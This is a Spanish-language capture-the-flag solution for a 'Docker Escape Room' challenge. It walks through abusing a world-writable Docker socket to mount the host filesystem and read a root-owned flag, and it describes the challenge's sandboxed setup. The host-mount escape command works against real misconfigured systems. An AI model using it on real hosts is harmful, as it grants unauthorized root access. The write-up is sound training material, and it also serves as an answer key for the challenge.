# Solución — Docker Escape Room

| Desafío | Categoría | Dificultad | Puntos | Flag Oficial |
| :--- | :--- | :--- | :--- | :--- |
| **Docker Escape Room** | Redes | Media | 300 | `CHRONOS{GUID}` / `flag{GUID}` |

---

## 1. Acceso inicial

El participante recibe credenciales para acceder por SSH a un puerto expuesto:

```bash
ssh ctfuser@<TARGET_IP> -p 2223
# Contraseña: ctf_docker_2024
```

Una vez dentro:
```bash
whoami     # ctfuser
id         # uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
sudo -l    # No tiene permisos de sudo ni grupo docker
```

---

## 2. Reconocimiento y Detección de la Vulnerabilidad

Revisando archivos y sockets comunes en el sistema:

```bash
ls -la /var/run/docker.sock
```

Salida observada:
```text
lrwxrwxrwx 1 root root 36 Oct  1 16:00 /var/run/docker.sock -> /var/run/docker-shared/docker.sock
srw-rw-rw- 1 root root  0 Oct  1 16:00 /var/run/docker-shared/docker.sock
```

El socket de Docker UNIX está accesible para **lectura y escritura para cualquier usuario del sistema (`666` / `rw-rw-rw-`)**.

### Causa Raíz:
Tener permisos de escritura en el socket de Docker equivale a tener privilegios de **root total sobre el host**, ya que la API de Docker permite crear contenedores privilegiados, montar volúmenes arbitrarios del sistema de archivos anfitrión y ejecutar comandos con UID 0.

---

## 3. Explotación y Escape del Contenedor

Dado que el cliente CLI `docker` se encuentra preinstalado en el contenedor SSH, podemos comunicarnos con el daemon:

```bash
docker images
```

Se observa la imagen `alpine:latest` disponible en el daemon.

Para escapar del entorno y leer `/root/flag.txt` del host:
Lanzamos un nuevo contenedor montando la raíz completa del host (`/`) en el directorio `/mnt` dentro del nuevo contenedor:

```bash
docker run --rm -v /:/mnt alpine cat /mnt/root/flag.txt
```

### Detalle del comando:
* `-v /:/mnt`: Monta el sistema de archivos completo del host daemon en `/mnt`.
* `alpine`: Imagen base ligera precargada en el entorno.
* `cat /mnt/root/flag.txt`: Lee el archivo con privilegios de root dentro del montaje.

---

## 4. Bandera Obtenida
La bandera es dinámica generada por GZCTF mediante la plantilla `CHRONOS{GUID}` (o `flag{GUID}`), por ejemplo:

```text
CHRONOS{b5a96d18-38f2-4e02-9a3b-851725832a81}
```

---

## 5. Verificación Automática

Se incluye un script de validación en `solution/solve.sh`:

```bash
chmod +x solution/solve.sh
./solution/solve.sh localhost 2223
```

Salida esperada:
```text
[*] Conectando a ctfuser@localhost:2223 ...
[*] Bandera obtenida: CHRONOS{docker_sock_root_host_escape_1684}
[+] EXITO: la bandera coincide con la oficial.
```

---

## 6. Arquitectura Segura del Reto (Sandboxing)

Este reto utiliza **Docker-in-Docker (DinD)** para el servicio `docker-host`. Esto asegura que:
1. La escalada ocurre dentro del contenedor simulador `ctf-docker-host`.
2. **El host físico / máquina virtual de la infraestructura del torneo nunca es comprometido**, garantizando aislamiento absoluto entre competidores y la plataforma central.
3. La imagen `alpine:latest` viene precargada localmente, garantizando funcionamiento 100% offline sin depender de descargas externas durante la competencia.
